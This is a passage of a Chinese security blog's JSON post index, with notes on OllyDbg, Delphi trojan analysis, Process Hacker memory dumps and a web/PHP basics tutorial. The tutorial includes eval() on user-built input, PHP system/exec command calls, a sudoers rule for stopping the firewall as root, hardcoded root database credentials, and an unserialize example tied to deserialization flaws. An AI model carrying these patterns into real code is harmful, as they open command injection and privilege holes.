调试技巧","slug":"逆向/OD调试小技巧","date":"2023-08-09T16:00:00.000Z","updated":"2024-03-12T15:19:12.477Z","comments":true,"path":"2023/08/10/逆向/OD调试小技巧/","link":"","permalink":"http://zwjsfdbb.top/2023/08/10/%E9%80%86%E5%90%91/OD%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"1、OD的Debugging Options 中勾选Break on new module(DLL)。 2、OD的Debugging Options 中勾选Break on new thread。 3、OD插件 LoadMapEx 加载OD生成的MAP文件，可以看出符号基本识别","text":"1、OD的Debugging Options 中勾选Break on new module(DLL)。 2、OD的Debugging Options 中勾选Break on new thread。 3、OD插件 LoadMapEx 加载OD生成的MAP文件，可以看出符号基本识别","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"Delphi木马分析","slug":"逆向/Delphi木马分析","date":"2023-08-07T16:00:00.000Z","updated":"2024-03-12T15:09:39.513Z","comments":true,"path":"2023/08/08/逆向/Delphi木马分析/","link":"","permalink":"http://zwjsfdbb.top/2023/08/08/%E9%80%86%E5%90%91/Delphi%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/","excerpt":"1、一般拿到的Delphi 程序，初始界面如图，不会有什么关键信息 2、左边的函数窗口，寻找FormCreate以及Timer相关的函数 FormCreate 函数 Timer相关的函数 3、分析以上函数即可。","text":"1、一般拿到的Delphi 程序，初始界面如图，不会有什么关键信息 2、左边的函数窗口，寻找FormCreate以及Timer相关的函数 FormCreate 函数 Timer相关的函数 3、分析以上函数即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"Web 基础知识","slug":"Web渗透/Web基础知识","date":"2023-07-30T16:00:00.000Z","updated":"2024-03-12T10:15:02.845Z","comments":true,"path":"2023/07/31/Web渗透/Web基础知识/","link":"","permalink":"http://zwjsfdbb.top/2023/07/31/Web%E6%B8%97%E9%80%8F/Web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"一、HTML语言1、HTML 超文本标记语言，由一系列事先约定好的标记、属性和内容组成。 文本：设置字体、大小、颜色 图片：设置边框、大小、位置 超链接：图片文本都可以添加超链接 表格：行列的结构化数据，设置大小、背景 表单：文本框、下拉框、单选框、复选框、按钮、文本域等 多媒体：视频、音频 2、CSS： Cascade Style Sheet 层叠样式表，用于对页面元素进行布局和美化 3、JavaScript： 浏览器中运行的解释型编程语言，用于进行页面的交互。 二、HTML基本元素的使用1、各个元素的简单使用1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;This is a demo Html&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 文本 --&gt; &lt;div style=&quot;font-family: 宋体 ;font-size:20px&quot;&gt;12314&lt;/div&gt; &lt;!-- 图片 --&gt; &lt;img src=&quot;img/20230213-1.png&quot; width=&quot;500px&quot;&gt;&lt;br/&gt; &lt;!-- 超链接 使用target=&quot;_blank&quot; 打开新的标签页 --&gt; &lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt; &lt;!-- 表格 --&gt; &lt;table width=&quot;500&quot; height=&quot;100&quot; border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;!-- 文本框 --&gt; &lt;input type=&quot;text&quot; placeholder=&quot;请输入用户名&quot;&gt; &lt;!-- 密码 --&gt; &lt;input type=&quot;password&quot;&gt; &lt;!-- 按钮 --&gt; &lt;input type=&quot;button&quot; value=&quot;登录&quot;&gt; &lt;!-- 下拉框 --&gt; &lt;select&gt; &lt;option&gt;选项1&lt;/option&gt; &lt;option selected&gt;选项2&lt;/option&gt; &lt;/select&gt; &lt;!-- 按钮 --&gt; &lt;button&gt;点我&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 2、CSS选择器 标签选择器 1234td&#123; background-color: grey;/* 设置背景色*/ margin: auto; /* 设置容器水平居中*/ &#125; 类选择器 1234.button&#123; background-color: grey;/* 设置背景色*/ margin: auto; /* 设置容器水平居中*/ &#125; ID选择器 1234#button&#123; background-color: grey;/* 设置背景色*/ margin: auto; /* 设置容器水平居中*/ &#125; 属性选择器 div [type=&quot;button&quot;]&#123; background-color: #7fffd4; width: 25%; text-align: center; font-size: 30px; &#125; 组合选择器 123456#button td&#123; background-color: #7fffd4; width: 25%; text-align: center; font-size: 30px; &#125; 伪类选择器 1234// 设置悬停效果.button div:hover&#123; background-color: #7fffd4;&#125;","text":"一、HTML语言1、HTML 超文本标记语言，由一系列事先约定好的标记、属性和内容组成。 文本：设置字体、大小、颜色 图片：设置边框、大小、位置 超链接：图片文本都可以添加超链接 表格：行列的结构化数据，设置大小、背景 表单：文本框、下拉框、单选框、复选框、按钮、文本域等 多媒体：视频、音频 2、CSS： Cascade Style Sheet 层叠样式表，用于对页面元素进行布局和美化 3、JavaScript： 浏览器中运行的解释型编程语言，用于进行页面的交互。 二、HTML基本元素的使用1、各个元素的简单使用1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;This is a demo Html&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 文本 --&gt; &lt;div style=&quot;font-family: 宋体 ;font-size:20px&quot;&gt;12314&lt;/div&gt; &lt;!-- 图片 --&gt; &lt;img src=&quot;img/20230213-1.png&quot; width=&quot;500px&quot;&gt;&lt;br/&gt; &lt;!-- 超链接 使用target=&quot;_blank&quot; 打开新的标签页 --&gt; &lt;a href=&quot;http://www.baidu.com&quot; target=&quot;_blank&quot;&gt;百度&lt;/a&gt; &lt;!-- 表格 --&gt; &lt;table width=&quot;500&quot; height=&quot;100&quot; border=&quot;1&quot;&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;!-- 文本框 --&gt; &lt;input type=&quot;text&quot; placeholder=&quot;请输入用户名&quot;&gt; &lt;!-- 密码 --&gt; &lt;input type=&quot;password&quot;&gt; &lt;!-- 按钮 --&gt; &lt;input type=&quot;button&quot; value=&quot;登录&quot;&gt; &lt;!-- 下拉框 --&gt; &lt;select&gt; &lt;option&gt;选项1&lt;/option&gt; &lt;option selected&gt;选项2&lt;/option&gt; &lt;/select&gt; &lt;!-- 按钮 --&gt; &lt;button&gt;点我&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 2、CSS选择器 标签选择器 1234td&#123; background-color: grey;/* 设置背景色*/ margin: auto; /* 设置容器水平居中*/ &#125; 类选择器 1234.button&#123; background-color: grey;/* 设置背景色*/ margin: auto; /* 设置容器水平居中*/ &#125; ID选择器 1234#button&#123; background-color: grey;/* 设置背景色*/ margin: auto; /* 设置容器水平居中*/ &#125; 属性选择器 div [type=&quot;button&quot;]&#123; background-color: #7fffd4; width: 25%; text-align: center; font-size: 30px; &#125; 组合选择器 123456#button td&#123; background-color: #7fffd4; width: 25%; text-align: center; font-size: 30px; &#125; 伪类选择器 1234// 设置悬停效果.button div:hover&#123; background-color: #7fffd4;&#125; 三、JavaScript1、DOM操作直接操作页面元素的方法的集合，是一套JS代码接口。此外还有BOM，通过JS操作浏览，比如前进，后退、导航、刷新等。 执行顺序问题 放在前面，可能会因为页面还未加载出现找不到元素的问题，可通过放在后面解决。 此外也可以写成一个函数，通过onload和onclick来触发函数 12345678910111213 &lt;script&gt; function calTitle()&#123; // 加Var 代表局部变量，不加是全局，建议加var 定义变量 var calTitle1 = document.getElementsByClassName(&quot;title&quot;)[0].innerHTML; window.alert(calTitle1); &#125; //var calTitle = document.getElementsByClassName(&quot;title&quot;).innerHTML; //window.alert(calTitle); &lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;calTitle()&quot;&gt;&lt;/body&gt;// &lt;div class=&quot;title&quot; onclick=&quot;calTitle()&quot;&gt; 蜗牛计算器&lt;/div&gt; JS定位元素 1234567891、document.getElementdocument.getElementById document.getElementsByClassNamedocument.getElementsByNamedocument.getElementsByTagNamedocument.getElementsByTagNameNS2、xpath// 获取所有标签为a的元素并且id 为 &#x27;web-nav-app-download-btn&#x27;var a=document.evaluate(&quot;//a[@id=&#x27;web-nav-app-download-btn&#x27;]&quot;, document).iterateNext() 2 、JS 实现基本的计算逻辑123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;基于Table实现计算器&lt;/title&gt; &lt;style&gt; /* 类选择器*/ .button&#123; background-color: grey;/* 设置背景色*/ margin: auto; /* 设置容器水平居中*/ &#125; /* 层次选择器，选择button 下面的所有标签为td的元素*/ .button td&#123; background-color: #7fffd4; width: 25%; text-align: center; font-size: 30px; &#125; .point-red&#123; width: 20px; height: 20px; background-color: red; float: left; margin-left: 10px; border-radius: 50%; &#125; .point-blue&#123; width: 20px; height: 20px; background-color: blue; float: left; margin-left: 10px; border-radius: 50%; &#125; .point-green&#123; width: 20px; height: 20px; background-color: green; float: left; margin-left: 10px; border-radius: 50%; &#125; .title&#123; color: white; font-size: 22px; float: right; margin-right: 20px; &#125; &lt;/style&gt; &lt;script&gt; function isLastCharacterNumber(str) &#123; // 使用正则表达式匹配最末尾是否为数字 return /\\d$/.test(str); &#125; // 输入数字 function clickNumber(number) &#123; var result = document.getElementById(&quot;result&quot;); result.innerHTML += number; &#125; // 输入运算符 function clickOperator(operator) &#123; var result = document.getElementById(&quot;result&quot;); result_text = result.innerHTML; if (isLastCharacterNumber(result_text)) &#123; result.innerHTML +=operator; &#125; else&#123; window.alert(&quot;输入不合法!&quot;); &#125; &#125; // 输入小数点 function clickPointer(operator) &#123; var result = document.getElementById(&quot;result&quot;); result_text = result.innerHTML; if (isLastCharacterNumber(result_text)) &#123; var match = result_text.match(/[\\d.]+$/); var HasPoint = /\\./.test(match); if (HasPoint) &#123; window.alert(&quot;输入不合法&quot;); &#125; else&#123; result.innerHTML +=operator; &#125; &#125; else&#123; window.alert(&quot;输入不合法!&quot;); &#125; &#125; // 计算结果 eval 把字符串当代码执行 function doCalc() &#123; var result = document.getElementById(&quot;result&quot;); var expression = result.innerHTML; result.innerHTML = eval(expression); &#125; // 清空结果 function doClear()&#123; var result = document.getElementById(&quot;result&quot;); result.innerHTML = &quot;&quot;; &#125; // 删除（退格） function doBack() &#123; var result = document.getElementById(&quot;result&quot;); result_text = result.innerHTML; var len = result_text.length; result.innerHTML = result_text.substring(0,len-1); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 两行一列 完成顶部和结果栏 --&gt; &lt;table width=&quot;450&quot; height=&quot;120&quot; cellspacing=&quot;5&quot; border=&quot;0&quot; bgcolor=&quot;grey&quot; align=&quot;center&quot;&gt; &lt;tr&gt; &lt;td bgcolor=&quot;grey&quot; height=&quot;50&quot; &gt; &lt;div class=&quot;point-red&quot;&gt;&lt;/div&gt; &lt;div class=&quot;point-blue&quot;&gt;&lt;/div&gt; &lt;div class=&quot;point-green&quot;&gt;&lt;/div&gt; &lt;div class=&quot;title&quot; onclick=&quot;calTitle()&quot;&gt; 蜗牛计算器&lt;/div&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td bgcolor=&quot;white&quot; style=&quot;border:solid 2px red;&quot; id=&quot;result&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;!-- 五行四列计算器 --&gt; &lt;table width=&quot;450&quot; height=&quot;400&quot; border=&quot;0&quot; align=&quot;center&quot; cellspacing=&quot;4&quot; class=&quot;button&quot; &gt; &lt;tr&gt; &lt;td onclick=&quot;doClear()&quot;&gt;AC&lt;/td&gt; &lt;td&gt;+/-&lt;/td&gt; &lt;td onclick=&quot;clickOperator(&#x27;%&#x27;)&quot;&gt;%&lt;/td&gt; &lt;td onclick=&quot;clickOperator(&#x27;/&#x27;)&quot;&gt;÷&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td onclick=&quot;clickNumber(7)&quot;&gt;7&lt;/td&gt; &lt;td onclick=&quot;clickNumber(8)&quot;&gt;8&lt;/td&gt; &lt;td onclick=&quot;clickNumber(9)&quot;&gt;9&lt;/td&gt; &lt;td onclick=&quot;clickOperator(&#x27;*&#x27;)&quot;&gt;*&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td onclick=&quot;clickNumber(4)&quot;&gt;4&lt;/td&gt; &lt;td onclick=&quot;clickNumber(5)&quot;&gt;5&lt;/td&gt; &lt;td onclick=&quot;clickNumber(6)&quot;&gt;6&lt;/td&gt; &lt;td onclick=&quot;clickOperator(&#x27;-&#x27;)&quot;&gt;-&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td onclick=&quot;clickNumber(1)&quot;&gt;1&lt;/td&gt; &lt;td onclick=&quot;clickNumber(2)&quot;&gt;2&lt;/td&gt; &lt;td onclick=&quot;clickNumber(3)&quot;&gt;3&lt;/td&gt; &lt;td onclick=&quot;clickOperator(&#x27;+&#x27;)&quot;&gt;+&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td onclick=&quot;clickNumber(0)&quot;&gt;0&lt;/td&gt; &lt;td onclick=&quot;doBack()&quot;&gt;删除&lt;/td&gt; &lt;td onclick=&quot;clickPointer(&#x27;.&#x27;)&quot;&gt;.&lt;/td&gt; &lt;td onclick=&quot;doCalc()&quot;&gt;=&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 四、PHP语法1、基本概念php 运行于web服务器中，主要用于网页的处理。 2、变量命名规范 变量以 $ 符号开始，后面跟着变量的名称 变量名必须以字母或者下划线字符开始 变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ） 变量名不能包含空格 变量名是区分大小写的（$y 和 $Y 是两个不同的变量） 3、正则 字符串匹配 1echo preg_match($pattern,$str) 字符串查找 1preg_match_all($pattern,$str,$result); 字符串替换 1$temp = preg_replace($pattern1,$replace_str,$str); 4、数组1234567&lt;?php$arr = array(&quot;123&quot;,&quot;123123&quot;);$len = count($arr);echo $len. &quot;&lt;br&gt;&quot;;echo $arr[0].&quot;&lt;br&gt;&quot;;?&gt; 5、前后端交互三种请求方式 资源请求型：GET+URL 数据提交型：POST+URL+请求正文 AJAX提交：异步提交，在不刷新当前页面的前提下，提交数据到后台 POST请求 必须被包裹 必须指定action，即提交的对象 必须指定提交方式 method&#x3D;”GET&#x2F;POST” 必须确保在form标签中，有至少一个提交按钮 1234567891011121314&lt;form action=&quot;login.php&quot; method=&quot;POST&quot;&gt; &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;label for=&quot;captcha&quot;&gt;验证码:&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;captcha&quot; name=&quot;captcha&quot; required&gt;&lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;&lt;/form&gt; AJAX请求 引入Jquery 库 123456789101112131415161718&lt;script type=&quot;text/javascript&quot; src=&quot;./jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; function dopost() &#123; //获取表单元素的值 var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); var captcha = $(&quot;#captcha&quot;).val(); //通过字符串拼接为请求正文 var parm = &quot;username=&quot; + username + &quot;&amp;password=&quot;+ password+ &quot;&amp;captcha=&quot;+captcha; // window.alert(parm); //利用AJAX发送POST请求 $.post(&quot;login.php&quot;,parm,function(data)&#123; window.alert(data); &#125;); &#125;&lt;/script&gt; 6、 Session和Cookie HTTP 默认是无状态的，服务器不知道客户端是谁，使用Session来将客户端的状态保存在服务器。 服务端启用Session 1234567891011// 记录登录的状态session_start();$_SESSION[&#x27;login&#x27;] = &#x27;True&#x27;;// 判断session_start()if($_SESSION[&#x27;login&#x27;])!=&#x27;True&#x27;)&#123; window.alert(&quot;请先登录&quot;);&#125; session的机制决定了存在安全漏洞，无法避免。 7、php 执行指令1234567891011121314151617181920212223&lt;?php// 使用php 执行命令// 1 使用反引号// $result = `ipconfig`;// $result = iconv(&quot;GBK&quot;,&quot;UTF-8&quot;,$result);// echo $result;//2 system 函数$result = system(&quot;whoami&quot;);echo $result;//3 exec 函数echo exec(&quot;whoami&quot;);// 很多命令 php 的默认用户www 没有权限执行，实在需要执行，添加权限到/etc/sudoers 文件中去// 如下所示为授权cleint 用户在任何地点以root 用户身份执行 /usr/bin/systemctl stop firewalld//cleint ALL=(root) /usr/bin/systemctl stop firewalld?&gt; 8、读写文件 file_get_contents函数、file_put_contents函数，fopen函数、fwirte函数、fclose函数等 12345678910111213141516171819202122232425&lt;?php// 取消超时30s限制set_time_limit(0);// 实时输出某个文件的内容$pos = 0;while(true)&#123; $fp = fopen(&quot;test.txt&quot;,&#x27;r&#x27;); fseek($fp,$pos); while($line=fgets($fp)) &#123; $line = iconv(&quot;GBK&quot;,&quot;UTF-8&quot;,$line); echo $line . &quot;&lt;br&gt;&quot;; &#125; $pos = ftell($fp); fclose($fp); ob_flush(); flush(); sleep(2); &#125;?&gt; 9、php 操作json 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script&gt; function json() &#123; var users = [&quot;张三&quot;,&quot;李四&quot;]; for(var i=0;i&lt;users.length;i++) &#123; document.write(users[i]+&quot;&lt;br&gt;&quot;); &#125; var user1 = &#123;&quot;name&quot;:&quot;张三&quot;,&quot;sex&quot;:&quot;男&quot;&#125;; var user2 = &#123;&quot;name&quot;:&quot;李四&quot;,&quot;sex&quot;:&quot;女&quot;&#125;; var user11 = &#123;user1:[&quot;张三&quot;,&quot;男&quot;],user2:[&quot;李四&quot;,&quot;女&quot;]&#125; var user = [user1,user2]; // document.write(user1.name +&quot;&lt;br&gt;&quot;); // document.write(user1.sex+&quot;&lt;br&gt;&quot;); // document.write(user[0].name+&quot;&lt;br&gt;&quot;); // document.write(user11.user1[0]+&quot;&lt;br&gt;&quot;); // &#125; &lt;/script&gt;&lt;/head&gt;&lt;body onload=&quot;json()&quot;&gt; &lt;?php //引用其他php // require_once(&quot;comm.php&quot;); include_once(&quot;comm.php&quot;); $user1 = array(&quot;name&quot;=&gt;&quot;张三&quot;,&quot;sex&quot;=&gt;&quot;男&quot;); $user2 = array(&quot;name&quot;=&gt;&quot;李四&quot;,&quot;sex&quot;=&gt;&quot;女&quot;); $user = array($user1,$user2); print_r($user); echo json_encode($user); //JSON 序列化 将变量或者对象转换成字符串 相反也有JSON反序列化,把字符串转成变量或者对象 $string = &#x27;[&#123;&quot;name&quot;:&quot;\\u5f20\\u4e09&quot;,&quot;sex&quot;:&quot;\\u7537&quot;&#125;,&#123;&quot;name&quot;:&quot;\\u674e\\u56db&quot;,&quot;sex&quot;:&quot;\\u5973&quot;&#125;]&#x27;; $array = json_decode($string); print_r($array); ?&gt; &lt;/body&gt;&lt;/html&gt; php 操作xml 12345678910111213141516171819202122232425$doc = new DOMDocument();$doc-&gt;preserveWhiteSpace = false;$doc-&gt;load(&#x27;.\\\\student.xml&#x27;);// 读取class节点的属性$nodes = $doc-&gt;getElementsByTagName(&#x27;class&#x27;);$attr = $nodes-&gt;item(0)-&gt;attributes-&gt;item(0)-&gt;nodeName;$attr_value = $nodes-&gt;item(0)-&gt;attributes-&gt;item(0)-&gt;nodeValue;echo $attr;// 读取student节点的属性$nodes = $doc-&gt;getElementsByTagName(&#x27;student&#x27;);$childnodes = $nodes-&gt;item(1)-&gt;childNodes;foreach($childnodes as $node)&#123; echo $node-&gt;nodeValue . &quot;&lt;br&gt;&quot;;&#125;// 读取所有学生的名字$nodes = $doc-&gt;getElementsByTagName(&quot;name&quot;);foreach($nodes as $node)&#123; echo $node-&gt;nodeValue . &quot;&lt;br&gt;&quot;;&#125; 11、PHP 面向对象 ​ 封装 123456789101112131415161718192021222324252627282930313233&lt;?phpclass People&#123; // 封装 public private protected // 1. 默认情况下，所有属性和方法，都是public // 2 private 表示类私有，在类的定义这种可以使用，而在实例和子类中无法使用 // 3 protected 表示受类的保护，实例中不能直接使用。子类中可以使用 private $name = &quot;&quot;; var $age = 0; var $addr = &quot;&quot;; var $nation = &quot;&quot;; //定义方法 function talk() &#123; echo &quot;$this-&gt;name&quot; . &quot;人正在说话 &lt;br&gt;&quot;; &#125; // 针对私有属性，在公有方法中进行修改 function setName($name) &#123; $this-&gt;name = $name; echo &quot;$this-&gt;name&quot;; &#125;&#125;$p1 = new People();$p1-&gt;age = 30;$p1-&gt;addr = &quot;成都&quot;;$p1-&gt;nation = &quot;汉族&quot;;$p1-&gt;setName(&quot;张三&quot;);?&gt; 继承 12345678910111213141516171819// 继承 Man是People的子类class Man extends People&#123; // Man可以使用People 的非私有属性和方法 var $name = &#x27;&#x27;; function work() &#123; $this-&gt;eat(); //子类中可以使用父类的受保护的方法 // parent::eat(); echo &quot;$this-&gt;name&quot; . &quot;正在工作 &lt;br&gt;&quot;; &#125;&#125;$m = new Man();echo $m-&gt;age;$m-&gt;name = &quot;子类&quot;; $m-&gt;work();?&gt; 多态 针对弱类型编程语言，多态不是特别的准确，在强类型编程语言中，较为重要。 抽象类： 类的方法中有一个方法使用abstract 关键字定义，则该类就是抽象类，该方法就是抽象方法 ​ 抽象类的特点，不能被实例化，只能被继承，抽象方法不能有实现代码。 123456789101112131415abstract class animal&#123; //抽象类 abstract functin can(); //抽象方法&#125;class cat extends animal&#123; function can() &#123; echo &quot; I can climb &lt;br&gt;&quot;; &#125;&#125;function test($obj)&#123; $obj&gt;can();&#125;test(new cat()); final 关键词 ​ 如果一个类被final 修饰，则该类不能被继承。 php 面向对象示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061class DB&#123; var $host = &#x27;&#x27;; var $username = &#x27;&#x27;; var $password = &#x27;&#x27;; var $database = &#x27;&#x27;; var $conn = null; // 构造方法 function __construct($host=&#x27;127.0.0.1&#x27;,$username=&#x27;root&#x27;,$password = &#x27;123456&#x27;,$database=&#x27;learn&#x27;) &#123; $this-&gt;host = $host; $this-&gt;username = $username; $this-&gt;password = $password; $this-&gt;database = $database; $this-&gt;Create_Connection(); &#125; // 创建连接 private function Create_Connection() &#123; $this-&gt;conn = mysqli_connect($this-&gt;host,$this-&gt;username,$this-&gt;password,$this-&gt;database); &#125; // 查询 function mysql_query($sql) &#123; $result = mysqli_query($this-&gt;conn,$sql); $rows = mysqli_fetch_all($result,MYSQLI_ASSOC); return $rows; &#125; // 更新 function mysql_modify($sql) &#123; $result = mysqli_query($this-&gt;conn,$sql); if(!$result) &#123; die(&quot;数据库更新失败&quot;); &#125; &#125; // 关闭连接 private function Close_connection() &#123; if($this-&gt;conn!=null) &#123; mysqli_close($this-&gt;conn); &#125; &#125; // 析构方法 function __destruct() &#123; $this-&gt;Close_connection(); &#125;&#125; 序列化与反序列化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//1、字符串的序列化$name = &quot;张三&quot;;echo serialize($name);//s:6:&quot;张三&quot;;//2、数组的序列胡$studen = array(&quot;name&quot;=&gt;&quot;张三&quot;,&quot;age&quot;=&gt;30);echo serialize($studen);// a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:3:&quot;age&quot;;i:30;&#125;// 符合序列化规则的字符串，无论是否由serialize 函数生成，都可以被反序列化$stu = unserialize(&#x27;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:3:&quot;age&quot;;i:30;&#125;&#x27;);print_r($stu);//3、类的序列化 // (1)、魔术方法 _Sleep() /* 魔术方法 当类进行序列化时自动调用，并且返回一个数据，包含要序列化的类属性 function __sleep() &#123; echo &quot;DB 正在进行序列化&lt;br&gt;&quot;; return array(&quot;host&quot;,&quot;username&quot;,&quot;password&quot;,&quot;database&quot;); &#125;*/$db = new DB();echo serialize($db);//DB 正在进行序列化 // O:2:&quot;DB&quot;:4:&#123;s:4:&quot;host&quot;;s:9:&quot;127.0.0.1&quot;;s:8:&quot;username&quot;;s:4:&quot;root&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:8:&quot;database&quot;;s:5:&quot;learn&quot;;&#125;$xx = unserialize(&#x27;O:2:&quot;DB&quot;:4:&#123;s:4:&quot;host&quot;;s:9:&quot;127.0.0.1&quot;;s:8:&quot;username&quot;;s:4:&quot;root&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:8:&quot;database&quot;;s:5:&quot;learn&quot;;&#125;&#x27;);echo $xx-&gt;host;echo $xx-&gt;mysql_query($sql); //这时候会失败， 因为没地方建立连接，此时需要借用魔术方法__wakeup()// (2)、__wakeup() 在类被反序列化时调用，并且可以在方法恢复类状态的代码，以便于让反序列化的实例可以正常调用方法/* //魔术方法 当类进行反序列化时调用 function __wakeup() &#123; echo &quot;DB 正在被反序列化&lt;br&gt;&quot;; $this-&gt;Create_Connection(); &#125;*/ 字符串变对象的过程中，如果没有对字符串进行输入检查，很有可能注入恶意代码，即反序列化漏洞。通常反序列化漏洞并非通过黑盒和盲注的方法进行探测，而通过代码评审进行漏洞验证。","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"动态快速分析之查找字符串","slug":"逆向/动态分析快速查找字符串","date":"2023-07-30T16:00:00.000Z","updated":"2024-03-12T14:42:51.603Z","comments":true,"path":"2023/07/31/逆向/动态分析快速查找字符串/","link":"","permalink":"http://zwjsfdbb.top/2023/07/31/%E9%80%86%E5%90%91/%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"1、分析工具Process Hacker 下载链接： https://sourceforge.net/projects/processhacker/files/processhacker2/processhacker-2.39-setup.exe/download 2、背景很多恶意代码喜欢注入进程到其他程序中从而隐蔽执行恶意代码，这是情况下想要快速的分析调试该程序是比较麻烦的，这里可以通过把用ProcessHacker 监控目标程序，对注入的进程进行内存dump 以及字符串查找，从而快速定位样本功能和行为。 双击被注入的进程，选择Memory 、选择strings，填入字符串长度，点击filter, 输入想查找的字符串 此外还可以dump 出 RWX 的内存区域，点击memory 后选择 内存属性为RWX 的dump 下来以后，进行分析。","text":"1、分析工具Process Hacker 下载链接： https://sourceforge.net/projects/processhacker/files/processhacker2/processhacker-2.39-setup.exe/download 2、背景很多恶意代码喜欢注入进程到其他程序中从而隐蔽执行恶意代码，这是情况下想要快速的分析调试该程序是比较麻烦的，这里可以通过把用ProcessHacker 监控目标程序，对注入的进程进行内存dump 以及字符串查找，从而快速定位样本功能和行为。 双击被注入的进程，选择Memory 、选择strings，填入字符串长度，点击filter, 输入想查找的字符串 此外还可以dump 出 RWX 的内存区域，点击memory 后选择 内存属性为RWX 的dump 下来以后，进行分析。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"suricata 